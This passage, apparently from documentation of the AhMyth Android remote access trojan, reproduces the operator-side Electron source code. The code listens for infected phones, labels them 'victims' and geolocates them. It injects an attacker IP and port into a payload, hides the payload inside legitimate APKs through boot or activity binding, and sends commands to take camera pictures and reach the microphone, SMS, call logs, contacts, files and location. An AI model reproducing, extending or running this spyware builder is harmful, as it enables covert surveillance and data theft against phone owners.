      event.reply('SocketIO:GeoIPError', warningMessage);
      event.sender.send('SocketIO:Log', warningMessage);
    } else {

      // if the IP is public 
      // Check the IP location
      var geo = geoip.lookup(ip);

      // handle exceptions
      if (geo) {
        if (geo.country) {
          country = geo.country.toLowerCase();
        } else {
          const warningMessage = `[!] GeoIP lookup returned no country for IP: ${ip}, Unable to determine the Victim's Country.`;
          event.reply('SocketIO:GeoIPError', warningMessage);
          event.sender.send('SocketIO:Log', warningMessage);
        }
      } else {
        const warningMessage = `[!] GeoIP lookup failed for IP: ${ip}, Unable to determine the Victim's Country.`;
        event.reply('SocketIO:GeoIPError', warningMessage);
        event.sender.send('SocketIO:Log', warningMessage);
      }
    }

    // Add the victim to victimList
    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

    //------------------------Notification SCREEN INIT------------------------------------
    // create the Notification window
    let notification = new BrowserWindow({
      frame: false,
      x: display.bounds.width - 280,
      y: display.bounds.height - 78,
      show: false,
      width: 280,
      height: 78,
      resizable: false,
      toolbar: false,
      webPreferences: {
        nodeIntegration: true,
        enableRemoteModule: true,
        contextIsolation: false,
      }
    });

    // Emitted when the window is finished loading.
    notification.webContents.on('did-finish-load', function () {
      notification.show();
      setTimeout(function () {
        notification.destroy()
      }, 3000);
    });

    notification.webContents.victim = victimsList.getVictim(index);
    notification.loadFile(__dirname + '/app/notification.html');

    enable(notification.webContents);

    // notify renderer process (AppCtrl) about the new Victim
    win.webContents.send('SocketIO:NewVictim', index);

    socket.on('disconnect', function () {
      // Check if the disconnection was server-initiated
      const isServerInitiated = IOs[port].sockets.serverInitiatedDisconnect;

      // Decrease the socket count on a disconnect
      victimsList.rmVictim(index);

      // notify renderer process (AppCtrl) about the server disconnecting from the Victim
      if (isServerInitiated) {
        win.webContents.send('SocketIO:StopAndRemoveVictim', index);
        IOs[port].sockets.serverInitiatedDisconnect = false; // reset the flag
      } else {
        // motify the render process (AppCtrl) about the Victim Disconnecting
        win.webContents.send('SocketIO:RemoveVictim', index);
      }

      if (windows[index]) {
        if (isServerInitiated) {
          // notify renderer process (LabCtrl) if opened about the Stop Button being clicked 
          // effectively disconnecting the server from the client 
          BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerTerminated");

          // delete the window from the windowsList
          delete windows[index]
        } else {
        // notify renderer process (LabCtrl) if opened about the disconnected Victim
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
        
        // delete the window from windowsList
        delete windows[index]
        };
      };
    });
  });

  event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port);
  listeningStatus[port] = true; // Update listening status for the specific port
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    const sockets = IOs[port].sockets.sockets;
    const hasActiveConnections = Object.keys(sockets).length > 0;

    // Set the flag to indicate server-initiated disconnection if there are active connections
    if (hasActiveConnections) {
      IOs[port].sockets.serverInitiatedDisconnect = true;
    }

    IOs[port].close();
    IOs[port] = null;

    if (hasActiveConnections) {
      win.webContents.send('SocketIO:ServerDisconnectMessage');
    } else {
      event.reply('SocketIO:Stop', '[✓] Stopped Listening on Port: ' + port);
    }

    listeningStatus[port] = false; // Update listening status for the specific port
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});

process.on('uncaughtException', function (error) {
  if (error.code == "EADDRINUSE") {
    win.webContents.send('SocketIO:ListenError', "Address Already in Use");
  } else {
    dialog.showErrorBox("ERROR", JSON.stringify(error));
    console.log(error);
  }
});

// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 700,
    height: 690,
    show: false,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
    }
  })

  //add this window to windowsList
  windows[index] = child.id;

  enable(child.webContents);
  //child.webContents.openDevTools();

  // pass the victim info to this victim lab
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadFile(__dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
    }
  })
});
```
<br>

- AppCtrl.js
```js
var app = angular.module('myapp', []);
const { ipcRenderer } = require('electron');
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
var fs = require('fs-extra');
var xml2js = require('xml2js');
var readdirp = require('readdirp');
const { dialog, getCurrentWindow } = require('@electron/remote');
const { getVictim } = require('@electron/remote').require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants');
const os = require('os');
const dir = require("path");

//--------------------------------------------------------------
var viclist = {};
var dataPath = dir.join(os.homedir(), CONSTANTS.dataDir);
var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);
//--------------------------------------------------------------

// App Controller for (index.html)
app.controller('AppCtrl', ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = {
        enable: false,
        method: 'BOOT'
    }; // default values for binding apk

    var log = document.getElementById("log");

    $appCtrl.logs = [];

    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    $appCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };

    // handle dark mode toggle
    $appCtrl.switch = async () => {
        const isDarkMode = await ipcRenderer.invoke('dark-mode:toggle');
        document.getElementById('theme-source').innerHTML = isDarkMode ? 'Dark' : 'Light';
        
        // Toggle the active class on the button
        const toggleButton = document.getElementById('toggle-dark-mode');
        if (isDarkMode) {
            toggleButton.classList.add('active');
            document.body.classList.add('dark-mode');
        } else {
            toggleButton.classList.remove('active');
            document.body.classList.remove('dark-mode');
        }
    };    

    // when the user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        ipcRenderer.send("SocketIO:Listen", port);
    };

    ipcRenderer.on("SocketIO:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = true;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        viclist[index] = getVictim(index);
        $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        $appCtrl.$apply();
    });

    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    };

    ipcRenderer.on('SocketIO:GeoIPError', (event, warning) => {
        $appCtrl.Log(warning, CONSTANTS.logStatus.WARNING);
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        delete viclist[index];
        $appCtrl.$apply();
    });

    // when the user clicks the stop button
    $appCtrl.StopListening = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        ipcRenderer.send("SocketIO:Stop", port);
    };

    ipcRenderer.on("SocketIO:Stop", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:StopError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:StopAndRemoveVictim', (event, index) => {
        delete viclist[index];
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:ServerDisconnectMessage', (event, port) => {
        $appCtrl.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    // app logs to print any new log in the black terminal
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;
        else if (status == CONSTANTS.logStatus.WARNING)
            fontColor = CONSTANTS.logColors.ORANGE;


        $appCtrl.logs.push({
            date: new Date().toLocaleString(), 
            msg: msg, 
            color: fontColor
        });
    
        // Use $timeout to ensure the view is updated before scrolling
        $timeout(() => {
            if (log) {
                // use smooth scrolling for a lovely clean log output
                log.scrollTo({ top: log.scrollHeight, behavior: 'smooth' });
            }
        }, 0);
    
        if (!$appCtrl.$$phase)
            $appCtrl.$apply();
    };

    // function to clear the logs each time a button is clicked,
    // this is done to keep things clean.
    $appCtrl.clearLogs = () => {
        if ($appCtrl.logs.length !== 0) {
            $appCtrl.logs = [];
        }
    }

    const architecture = process.arch;
    if (architecture === 'ia32') {
        delayedLog('[!] WARNING: AhMyth wWill Cease Support for All 32bit Systems Once Apktool reaches v3.0.0.', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('[★] Welcome to AhMyth Android R.A.T', CONSTANTS.logStatus.SUCCESS);
        delayedLog('————————————————————————————————————', CONSTANTS.logStatus.SUCCESS);
    }

    //function to open the dialog and choose apk to be bound
    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog({
            properties: ['openFile'],
            title: 'Choose APK to bind',
            buttonLabel: 'Select APK',
            filters: [{
                name: 'Android APK', extensions: ['apk']
            } //only select apk files
            ]
        }).then(result => {
            if (result.canceled) {
                $appCtrl.Log('[x] No APK Was Selected as a Template', CONSTANTS.logStatus.FAIL); //if user cancels the dialog
            } else {
                var printApkPath = result.filePaths[0];
                var printApkName = dir.basename(printApkPath);
                $appCtrl.Log('[¡] "' + printApkName + '"' + ' Was Chosen as a Template', CONSTANTS.logStatus.INFO); //when the user selects an apk
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log('[x] No APK Was Selected as a Template'); //if user cancels the dialog
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    $appCtrl.GenerateApk = async (apkFolder) => {
        if (!$appCtrl.bindApk.enable) {
            var checkBoxofCamera = document.getElementById("Permissions1");
            var checkBoxofStorage = document.getElementById("Permissions2");
            var checkBoxofMic = document.getElementById("Permissions3");
            var checkBoxofLocation = document.getElementById("Permissions4");
            var checkBoxofContacts = document.getElementById("Permissions5");
            var checkBoxofSms = document.getElementById("Permissions6");
            var checkBoxofCallsLogs = document.getElementById("Permissions7");

            // default permissions for the payload
            const permissions = CONSTANTS.permissions;

            // Create an array to store the selected permissions
            var selectedPermissions = [];

            // Check each checkbox and add the corresponding permission to the selectedPermissions array
            if (checkBoxofCamera.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
            }
            if (checkBoxofStorage.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
            }
            if (checkBoxofMic.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
            }
            if (checkBoxofLocation.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
            }
            if (checkBoxofContacts.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
            }
            if (checkBoxofSms.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
            }
            if (checkBoxofCallsLogs.checked) {
                selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
            }

            // If all checkboxes are checked, set selectedPermissions to the permissions array from CONSTANTS
            if (
                checkBoxofCamera.checked &&
                checkBoxofStorage.checked &&
                checkBoxofMic.checked &&
                checkBoxofLocation.checked &&
                checkBoxofContacts.checked &&
                checkBoxofSms.checked &&
                checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            // If all checkboxes are unchecked, set selectedPermissions to an empty array
            if (
                !checkBoxofCamera.checked &&
                !checkBoxofStorage.checked &&
                !checkBoxofMic.checked &&
                !checkBoxofLocation.checked &&
                !checkBoxofContacts.checked &&
                !checkBoxofSms.checked &&
                !checkBoxofCallsLogs.checked
            ) {
                selectedPermissions = permissions;
            }

            try {
                delayedLog('[★] Reading the Payload Manifest File...');
                const data = await fs.promises.readFile(dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'), 'utf8');

                try {
                    delayedLog('[★] Parsing the Payload Manifest Data...');
                    const parsedData = await new Promise((resolve, reject) => {
                        xml2js.parseString(data, (parseError, parsedData) => {
                            if (parseError) {
                                reject(parseError);
                            } else {
                                // Modify the manifest data as needed
                                parsedData.manifest['uses-permission'] = [];
                                parsedData.manifest['uses-feature'] = [];

                                selectedPermissions.forEach(permission => {
                                    if (permission === 'android.hardware.camera') {
                                        parsedData.manifest['uses-feature'].push({
                                            $: {
                                                'android:name': 'android.hardware.camera'
                                            }
                                        });
                                    }

                                    if (permission === 'android.hardware.camera.autofocus') {
                                        parsedData.manifest['uses-feature'].push({
                                            $: {
                                                'android:name': 'android.hardware.camera.autofocus'
                                            }
                                        });
                                    }

                                    if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                                        parsedData.manifest['uses-permission'].push({
                                            $: {
                                                'android:name': permission
                                            }
                                        });
                                    }
                                });

                                resolve(parsedData);
                            }
                        });
                    });

                    // Convert the modified parsed data back to XML
                    const builder = new xml2js.Builder();
                    const updatedData = builder.buildObject(parsedData);
                    await fs.promises.writeFile(
                        dir.join(CONSTANTS.ahmythApkFolderPath, 'AndroidManifest.xml'),
                        updatedData,
                        'utf8'
                    );
                } catch (parseError) {
                    delayedLog('[x] Error occurred while parsing the Payload Manifest:', CONSTANTS.logStatus.FAIL);
                    writeErrorLog(error, 'Parsing');
                    delayedLog('[¡] Error written to "Parsing.log" on', CONSTANTS.logStatus.INFO);
                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                    return;
                }
            } catch (readError) {
                // Handle errors related to reading the file
                delayedLog('[x] Error occurred while reading the Payload Manifest File:', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading');
                delayedLog('[¡] Error written to "Reading.log" on', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

        }

        try {
            delayedLog('[★] Emptying the Apktool Framework Directory...');
            exec('java -jar "' + CONSTANTS.apktoolJar + '" empty-framework-dir --force "' + '"',
                (error, stderr, stdout) => {
                    if (error) throw error;
                });
        } catch (error) {
            // Ignore the error by doing nothing
        }

        if ($appCtrl.bindApk.enable) {

            // Build and Sign the Bound AhMyth Payload
            var originApkName = dir.basename(apkFolder) + ".apk";
            delayedLog('[★] Building ' + originApkName + '...');
            var createBoundApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, originApkName) + '" --use-aapt2 "' + '"';
            exec(createBoundApk,
                (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Building');
                        delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    delayedLog('[★] Signing ' + originApkName + '...');
                    var signBoundApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, originApkName) + '"';
                    exec(signBoundApk, (error, stdout, stderr) => {
                        if (error !== null) {
                            delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Signing');
                            delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Remove the decompiled APK folder
                        delayedLog('[★] Cleaning up...')
                        fs.rmdir(apkFolder, {
                            recursive: true
                        }, (err) => {
                            if (err) throw err;
                        });

                        fs.unlink(dir.join(outputPath, originApkName),
                            (err) => {
                                if (err) throw err;

                                const apkNameBoundSigned = CONSTANTS.getApkNameBoundSigned(apkFolder);
                                delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
                                delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
                                delayedLog('[¡] ' + dir.join(outputPath, apkNameBoundSigned), CONSTANTS.logStatus.INFO);
                                delayedLog();

                                fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                                    if (err) throw err;
                                });
                            });
                    });
                });
        } else {
            // Build and Sign the Standalone AhMyth Payload
            var createApk = 'java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + dir.join(outputPath, CONSTANTS.apkName) + '" --use-aapt2 "' + '"';
            delayedLog('[★] Building ' + CONSTANTS.apkName + '...');
            exec(createApk,
                (error, stdout, stderr) => {
                    if (error !== null) {
                        delayedLog('[x] Building Failed', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Building');
                        delayedLog('[¡] Error written to "Building.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    delayedLog('[★] Signing ' + CONSTANTS.apkName + '...');
                    var signApk = 'java -jar "' + CONSTANTS.signApkJar + '" -a "' + dir.join(outputPath, CONSTANTS.apkName) + '"';
                    exec(signApk, (error, stdout, stderr) => {
                        if (error !== null) {
                            delayedLog('[x] Signing Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Signing');
                            delayedLog('[¡] Error written to "Signing.log" on ', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        fs.unlink(dir.join(outputPath, CONSTANTS.apkName),
                            (err) => {
                                if (err) throw err;

                                delayedLog('[✓] Payload Built Successfully', CONSTANTS.logStatus.SUCCESS);
                                delayedLog('[¡] The Payload has Been Stored at:', CONSTANTS.logStatus.INFO);
                                delayedLog('[¡] ' + dir.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.INFO);
                                delayedLog();

                                fs.copyFile(dir.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), dir.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
                                    if (err) throw err;
                                });
                            });
                    });
                });
        }
    };

    /* existing code */

    $appCtrl.Build = (ip, port) => {
        // Check Java version before proceeding
        checkJavaVersion((error, javaVersion) => {
            if (error) {
                $appCtrl.Log('[x] ' + error.message, CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[¡] Please Install any version of Java 8 upto 21 to Use This Feature.', CONSTANTS.logStatus.INFO);
                return;
            } else if (parseFloat(javaVersion) < 1.8 || parseFloat(javaVersion) >= 22) {
                // excludes any java version less than 8 or greater than or equal to 22
                $appCtrl.Log(`[x] Unsupported Java Version Installed, Detected Version "${javaVersion}"`, CONSTANTS.logStatus.FAIL);
                $appCtrl.Log('[¡] AhMyth Requires any Version of Java 8 through 21 to use This Feature.', CONSTANTS.logStatus.INFO);
                return;
            } else {
                if (!ip) {
                    $appCtrl.Log('[x] ' + 'IP Address Cannot Be Empty.', CONSTANTS.logStatus.FAIL);
                    return;
                }
                if (!port) {
                    port = CONSTANTS.defaultPort;
                }

                // check if bind apk is enabled
                if (!$appCtrl.bindApk.enable) {
                    delayedLog('[✓] Supported Java Version ' + javaVersion + ' Detected, Proceeding...', CONSTANTS.logStatus.SUCCESS);
                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'IP:PORT');
                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'IP:PORT');
                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }
                            $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
                        });
                    });
                } else {
                    var filePath = $appCtrl.filePath;
                    if (!filePath) {
                        $appCtrl.Log('[x] ' + 'Browse for the Original APK you Want to Bind With', CONSTANTS.logStatus.FAIL);
                        return;
                    }
                    if (!filePath.includes(".apk")) {
                        $appCtrl.Log('[x] ' + 'Sorry! This is not an APK file', CONSTANTS.logStatus.FAIL);
                        return;
                    }

                    delayedLog('[✓] Supported Java Version ' + javaVersion + ' Detected, Proceeding...', CONSTANTS.logStatus.SUCCESS);

                    var ipPortFile = dir.join(CONSTANTS.ahmythApkFolderPath, CONSTANTS.IOSocketPath);
                    delayedLog('[★] Reading (IP:PORT) File from ' + CONSTANTS.apkSourceName + dir.sep + CONSTANTS.IOSocketPath + '...');
                    fs.readFile(ipPortFile, 'utf8', (error, data) => {
                        if (error) {
                            delayedLog('[x] Reading (IP:PORT) File Failed', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'IP:PORT');
                            delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // only show the ipPortFile path from CONSTANTS.IOSocketPath, not the full path
                        var ipPortFilePath = CONSTANTS.IOSocketPath.split().pop(".smali");
                        delayedLog('[★] Adding User IP:PORT Input to ' + CONSTANTS.apkSourceName + dir.sep + ipPortFilePath + '...');

                        var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + ip + ":" + port);
                        fs.writeFile(ipPortFile, result, 'utf8', (error) => {
                            if (error) {
                                delayedLog('[x] Adding User IP:PORT Input Failed', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'IP:PORT');
                                delayedLog('[¡] Error Written to "IP-PORT.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // generate a solid ahmyth apk
                            var apkFolder = filePath.substring(0, filePath.indexOf(".apk"));
                            var apkName = dir.basename(apkFolder) + ".apk";
                            delayedLog('[★] ' + 'Decompiling ' + '"' + apkName + '"' + "...");

                            var decompileApk = 'java -jar "' + CONSTANTS.apktoolJar + '" d "' + filePath + '" -f -o "' + apkFolder + '"';

                            exec(decompileApk, (error, stdout, stderr) => {
                                if (error !== null) {
                                    delayedLog('[x] Decompiling Failed!', CONSTANTS.logStatus.FAIL);
                                    writeErrorLog(error, 'Decompiling');
                                    delayedLog('[¡] Error Written to "Decompiling.log" on', CONSTANTS.logStatus.INFO);
                                    delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                    return;
                                }

                                if ($appCtrl.bindApk.method == 'BOOT')
                                    $appCtrl.bindOnBoot(apkFolder);

                                else if ($appCtrl.bindApk.method == 'ACTIVITY')
                                    $appCtrl.bindOnActivity(apkFolder);

                            });
                        });
                    });
                }
            }
        });
    };
});

// Function to check if Java version 11 is installed
function checkJavaVersion(callback) {
    exec('java -version',
        (error, stdout, stderr) => {
            if (error) {
                callback(new Error('Java is not installed or not accessible.'));
            } else {
                const versionOutput = stderr || stdout;
                const versionMatch = versionOutput.match(/version "([^"]+)"/);
                if (versionMatch) {
                    const versionString = versionMatch[1];
                    callback(null, versionString);
                } else {
                    callback(new Error('Java is not installed or not accessible.'));
                }
            }
        });
}
```

</div>
</details>
</div>

<br>

<div align="center">
<details>
   
<summary>Lab & Notification Render Processes</summary>
<br>

<div align="left">

- Lab Render Process (LabCtrl.js)
```js
const { ipcRenderer } = require('electron');
const { dialog, getCurrentWindow } = require('@electron/remote');
const app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
const fs = require("fs-extra");
const CONSTANTS = require(__dirname + '/assets/js/Constants');
const ORDER = CONSTANTS.order;
const os = require('os');
const path = require("path");

const dataPath = path.join(os.homedir(), CONSTANTS.dataDir);
const downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
const outputPath = path.join(dataPath, CONSTANTS.outputApkPath);

let socket = require('@electron/remote').getCurrentWebContents().victim;

//-----------------------Routing Config------------------------
app.config(function ($routeProvider) {
    $routeProvider
        .when("/", {
            templateUrl: "./views/main.html"
        })
        .when("/camera", {
            templateUrl: "./views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "./views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/smsManager", {
            templateUrl: "./views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "./views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "./views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "./views/mic.html",
            controller: "MicCtrl"
        })
        .when("/location", {
            templateUrl: "./views/location.html",
            controller: "LocCtrl"
        });
});

//-----------------------LAB Controller (lab.html)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location) {
    $labCtrl = $scope;
    var log = document.getElementById("logy");
    $labCtrl.logs = [];

    const window = getCurrentWindow();
    $labCtrl.close = () => {
        window.close();
    };

    $labCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };

    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;
        else if (status == CONSTANTS.logStatus.WARNING)
            fontColor = CONSTANTS.logColors.ORANGE;

        $labCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        log.scrollTop = log.scrollHeight;
        if (!$labCtrl.$$phase)
            $labCtrl.$apply();
    }
    
    $labCtrl.clearLogs = () => {
        if ($labCtrl.logs.length !== 0) {
            $labCtrl.logs = [];
        }
    }

    // fired when notified from Main Process (main.js) about
    // this victim who disconnected
    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
        $rootScope.Log('[x] Victim Disconnected', CONSTANTS.logStatus.FAIL);
    });

    // fired when notified from the Main Process (main.js) about
    // the Server disconnection
    ipcRenderer.on('SocketIO:ServerTerminated', (event) => {
        $rootScope.Log('[¡] The Server was Terminated.', CONSTANTS.logStatus.INFO);
    });

    // to move from view to another
    $labCtrl.goToPage = (page) => {
        $location.path('/' + page);
    }

});

//-----------------------Camera Controller (camera.html)------------------------
// camera controller
app.controller("CamCtrl", function ($scope, $rootScope) {
    $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    var camera = CONSTANTS.orders.camera;

    // remove socket listner if the camera page is changed or destroied
    $camCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(camera);
    });

    $rootScope.Log("[i] Accessing the Victim's Available Cameras...", CONSTANTS.logStatus.INFO);
    $camCtrl.load = 'loading';
    // send order to victim to bring camera list
    socket.emit(ORDER, { order: camera, extra: 'camList' });

    // wait any response from victim
    socket.on(camera, (data) => {
        if (data.camList == true) { // the rseponse is camera list
            $rootScope.Log('[✓] Cameras list arrived', CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            $camCtrl.load = '';
            $camCtrl.selectedCam = $camCtrl.cameras[1];
            $camCtrl.$apply();
        } else if (data.image == true) { // the rseponse is picture

            $rootScope.Log('[✓] Picture arrived', CONSTANTS.logStatus.SUCCESS);

            // convert binary to base64
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
